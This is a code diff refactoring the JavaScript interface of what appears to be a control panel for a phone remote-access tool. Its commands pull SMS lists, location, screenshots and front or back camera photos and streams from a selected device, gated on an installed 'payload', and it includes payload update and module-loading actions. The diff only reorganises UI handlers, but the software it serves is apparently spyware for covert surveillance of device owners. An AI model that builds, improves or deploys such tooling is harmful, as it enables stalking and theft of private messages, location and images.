@@ -31,7 +31,9 @@ const UI = {
         // Global haptic feedback listener for instant animation
         const addPressed = (e) => {
             const btn = e.target.closest("button, .action-btn, .device-card, .tab-btn");
-            if (btn) btn.classList.add("is-pressed");
+            if (btn && !btn.classList.contains('is-disabled')) {
+                btn.classList.add("is-pressed");
+            }
         };
         const removePressed = (e) => {
             const btns = document.querySelectorAll(".is-pressed");
@@ -54,73 +56,28 @@ const UI = {
             const value = btn.dataset.value || "";
             const tab = btn.dataset.tab;
 
+            // Handle Tab Switching
             if (tab) {
                 if (btn.classList.contains("is-disabled")) return;
-                // Add micro-delay to allow :active animation to show on high-end devices
-                await new Promise(r => setTimeout(r, 80));
+                await new Promise(r => setTimeout(r, 60));
                 await showView(tab);
-
-                // Auto-close modal if tab button was clicked from inside a modal
-                if (btn.closest(".modal-card")) {
-                    closeModal();
-                }
+                if (btn.closest(".modal-card")) closeModal();
                 return;
             }
 
+            // Handle Toast Removal
             if (btn.dataset.toastId) {
                 removeToast(btn.dataset.toastId);
                 return;
             }
 
-            // 1. Instant logic for toggles (Optimistic UI)
-            if (action === "toggle-command") {
-                const d = state.data.selectedDevice;
-                const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
-                if (!status.payload_active) {
-                    setState({ ui: { modal: { type: "payload-required" } } });
-                    return;
-                }
-
-                const cmd = btn.dataset.command;
-                const key = btn.dataset.toggleKey;
-                if (cmd && key) {
-                    const oldValue = isToggleActive(key);
-                    const newValue = !oldValue;
-
-                    // Manual DOM Update: Instant, no flicker, preserves 'is-pressed' animation
-                    btn.classList.toggle("is-toggled", newValue);
-                    const iconWrap = btn.querySelector('.lucide-icon') || btn.querySelector('svg');
-                    if (iconWrap) {
-                        const toggle = getToggleConfig(key);
-                        const nextIcon = newValue ? toggle.on.icon : toggle.off.icon;
-                        iconWrap.outerHTML = renderIcon(nextIcon, "lucide-icon");
-                    }
-
-                    // Small delay to allow the haptic animation (scale down) to be visible
-                    await new Promise(r => setTimeout(r, 120));
-
-                    // Update actual state in background
-                    DeviceService.setToggleState(key, newValue);
-
-                    // Send network request
-                    const result = await DeviceService.send(cmd, { showSuccess: true });
-
-                    // Revert only if it's a real failure (not debounce)
-                    if (!result.success && result.error !== "debounce") {
-                        DeviceService.setToggleState(key, oldValue);
-                    }
-                    return;
-                }
-            }
-
-            // Add loading feedback for other actions (Streaming, Take Photo, etc)
-            const needsLoading = ["stream", "command", "select-device", "refresh-device"].includes(action);
+            // Action Protection & Loading State
+            const needsLoading = ["stream", "command", "select-device", "refresh-device", "modal"].includes(action);
             const btnKey = `${action}:${value}`;
 
             if (needsLoading) {
                 state.ui.loadingButtons.add(btnKey);
-                this.render(); // Immediate render to show spinner
-                await new Promise(r => setTimeout(r, 50));
+                this.render(); // Immediate sync render for visual feedback
             }
 
             try {
@@ -129,7 +86,11 @@ const UI = {
                 const isPayloadActive = !!status.payload_active;
                 const perms = status.permissions || {};
 
+                // Execute Actions
                 switch(action) {
+                    case "toggle-command":
+                        await this.handleToggle(btn);
+                        break;
                     case "stream":
                         if (!isPayloadActive) {
                             setState({ ui: { modal: { type: "payload-required" } } });
@@ -139,15 +100,11 @@ const UI = {
                             setState({ ui: { modal: { type: "permission-required", perm: "camera" } } });
                             break;
                         }
-                        const isRefresh = btn.classList.contains("refresh-overlay-btn");
-                        await this.handleStream(value, isRefresh ? "refresh" : "start");
+                        await this.handleStream(value, btn.classList.contains("refresh-overlay-btn") ? "refresh" : "start");
                         break;
                     case "stop-stream":
                         await StreamManager.stop("terminate");
                         closeModal();
-                        break;
-                    case "toggle-audio-stream":
-                        await this.toggleAudioStream();
                         break;
                     case "take-photo-setup":
                         if (!isPayloadActive) {
@@ -161,62 +118,31 @@ const UI = {
                         setState({ ui: { modal: { type: "take_photo_options" } } });
                         break;
                     case "command":
-                        // Khusus untuk UPDATE_PAYLOAD, kita belokkan ke proses visual injeksi
                         if (value === CMD.UPDATE_PAYLOAD) {
-                            this.handleModalAction(CMD.LOAD_MODULE, true); // true = update mode
+                            this.handleModalAction(CMD.LOAD_MODULE, true);
                             break;
                         }
-
                         if (!isPayloadActive) {
                             setState({ ui: { modal: { type: "payload-required" } } });
                             break;
                         }
 
-                        // Permission Checks
-                        if (value === CMD.SMS_LIST && !perms.sms) {
-                            setState({ ui: { modal: { type: "permission-required", perm: "sms" } } });
+                        // Permission checks for specific commands
+                        const permMap = { [CMD.SMS_LIST]: "sms", [CMD.LOCATION]: "location", [CMD.CAMERA_FRONT]: "camera", [CMD.CAMERA_BACK]: "camera" };
+                        if (permMap[value] && !perms[permMap[value]]) {
+                            setState({ ui: { modal: { type: "permission-required", perm: permMap[value] } } });
                             break;
-                        }
-                        if (value === CMD.LOCATION && !perms.location) {
-                            setState({ ui: { modal: { type: "permission-required", perm: "location" } } });
-                            break;
-                        }
-                        if ((value === CMD.CAMERA_FRONT || value === CMD.CAMERA_BACK) && !perms.camera) {
-                            setState({ ui: { modal: { type: "permission-required", perm: "camera" } } });
-                            break;
-                        }
-                        if (value.startsWith(CMD.REQ_PERM)) {
-                            const pKey = value.split(":")[1];
-                            const isGranted = pKey === "all" ? status.permissions_granted : perms[pKey];
-                            if (isGranted) {
-                                addToast("Permission already granted", "success");
-                                return;
-                            }
                         }
 
-                        const dataCmds = [CMD.SCREENSHOT, CMD.SMS_LIST, CMD.LOCATION, CMD.CAMERA_FRONT, CMD.CAMERA_BACK];
-                        const isDataCmd = dataCmds.includes(value);
-
-                        // Special handling for KILL_STREAM to ensure local state and signaling are also wiped
                         if (value === CMD.KILL_STREAM) {
                             await StreamManager.stop("killall", false, true);
-                            // Also clear signaling table manually as a fail-safe
                             await supabaseClient.from("signaling").delete().eq("device_id", state.data.selectedDeviceId);
                         }
 
                         const result = await DeviceService.send(value, { showSuccess: true });
                         if (state.ui.modal?.type === "take_photo_options") closeModal();
-
-                        if (result.success) {
-                            if (isDataCmd) {
-                                // Instant loading modal for data-returning commands
-                                setState({ ui: { modal: { type: "waiting-data", cmd: value } } });
-                            }
-                        } else {
-                            if (result.error !== "debounce") {
-                                btn.classList.add("shake-error");
-                                setTimeout(() => btn.classList.remove("shake-error"), 500);
-                            }
+                        if (result.success && [CMD.SCREENSHOT, CMD.SMS_LIST, CMD.LOCATION, CMD.CAMERA_FRONT, CMD.CAMERA_BACK].includes(value)) {
+                            setState({ ui: { modal: { type: "waiting-data", cmd: value } } });
                         }
                         break;
                     case "select-device":
@@ -226,18 +152,17 @@ const UI = {
                         await DeviceService.refreshSelected();
                         break;
                     case "close-modal":
-                        if (state.ui.modal?.type === "stream") {
-                            await StreamManager.stop("manual");
-                        } else {
-                            closeModal();
-                        }
+                        if (state.ui.modal?.type === "stream") await StreamManager.stop("manual");
+                        else closeModal();
                         break;
                     case "modal":
-                        this.handleModalAction(value);
+                        await this.handleModalAction(value);
                         break;
                 }
             } catch (err) {
                 console.error("Action error", err);
+                btn.classList.add("shake-error");
+                setTimeout(() => btn.classList.remove("shake-error"), 500);
             } finally {
                 if (needsLoading) {
                     state.ui.loadingButtons.delete(btnKey);
@@ -307,6 +232,38 @@ const UI = {
     async handleStream(mode = CMD.CAMERA_BACK, reason = "start") {
         if (reason === "start") state.stream.withAudio = true;
         await StreamManager.start(mode, reason === "refresh");
+    },
+
+    async handleToggle(btn) {
+        const d = state.data.selectedDevice;
+        const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
+        if (!status.payload_active) {
+            setState({ ui: { modal: { type: "payload-required" } } });
+            return;
+        }
+
+        const cmd = btn.dataset.command;
+        const key = btn.dataset.toggleKey;
+        if (!cmd || !key) return;
+
+        const oldValue = isToggleActive(key);
+        const newValue = !oldValue;
+
+        // Optimistic UI: Update DOM instantly
+        btn.classList.toggle("is-toggled", newValue);
+        const iconWrap = btn.querySelector('.lucide-icon') || btn.querySelector('svg');
+        if (iconWrap) {
+            const toggle = getToggleConfig(key);
+            iconWrap.outerHTML = renderIcon(newValue ? toggle.on.icon : toggle.off.icon, "lucide-icon");
+        }
+
+        await new Promise(r => setTimeout(r, 100));
+        DeviceService.setToggleState(key, newValue);
+
+        const result = await DeviceService.send(cmd, { showSuccess: true });
+        if (!result.success && result.error !== "debounce") {
+            DeviceService.setToggleState(key, oldValue);
+        }
     },
 
     async toggleAudioStream() {
@@ -482,30 +439,37 @@ const UI = {
             const hasDevice = selectedDeviceReady();
             const isModal = !!state.ui.modal;
 
+            // 1. Root Layout Control
             if (dom.authScreen) dom.authScreen.classList.toggle("hidden", !!user);
             if (dom.appShell) dom.appShell.classList.toggle("hidden", !user);
-            if (!user) return; // Stop if not logged in
+            if (!user) return;
 
+            // 2. Tabbar & Shell Context
             if (dom.tabbar) dom.tabbar.classList.toggle("hidden", !hasDevice);
             if (dom.tabbarScrim) dom.tabbarScrim.classList.toggle("hidden", !hasDevice);
             if (dom.mainShell) dom.mainShell.classList.toggle("has-tabbar", hasDevice);
             if (dom.deviceListButton) dom.deviceListButton.classList.toggle("hidden", !hasDevice);
+            if (dom.activeDeviceChip) dom.activeDeviceChip.textContent = state.data.selectedDevice?.name || "No Device Selected";
 
-            if (dom.activeDeviceChip) {
-                dom.activeDeviceChip.textContent = state.data.selectedDevice?.name || "No Device Selected";
-            }
-
+            // 3. View Switcher
             this.syncView(state.ui.view);
-            this.renderDevices();
-            this.renderActions();
-            this.renderSystem();
-            this.renderLogs();
+
+            // 4. Component Rendering (Ordered by Priority)
+            if (state.ui.view === "devices") this.renderDevices();
+            if (state.ui.view === "remote") this.renderActions();
+            if (state.ui.view === "system") {
+                this.renderActions();
+                this.renderSystem();
+            }
+            if (state.ui.view === "logs") this.renderLogs();
+
+            // 5. Overlay Rendering
             this.renderModal();
             this.renderToasts();
             this.renderTheme();
             this.syncScrollLock(isModal);
 
-            // Universal Icon Fix: Only process icons that are actually tag <i>
+            // 6. Icon Reconstruction
             if (window.lucide && dom.iconsDirty) {
                 const iconsToProcess = document.querySelectorAll('i[data-lucide]:not([data-lucide-processed])');
                 if (iconsToProcess.length > 0) {
@@ -515,7 +479,7 @@ const UI = {
                 dom.iconsDirty = false;
             }
         } catch (err) {
-            console.error("Critical Render Error", err);
+            console.error("Render Loop Error", err);
         }
     },
 
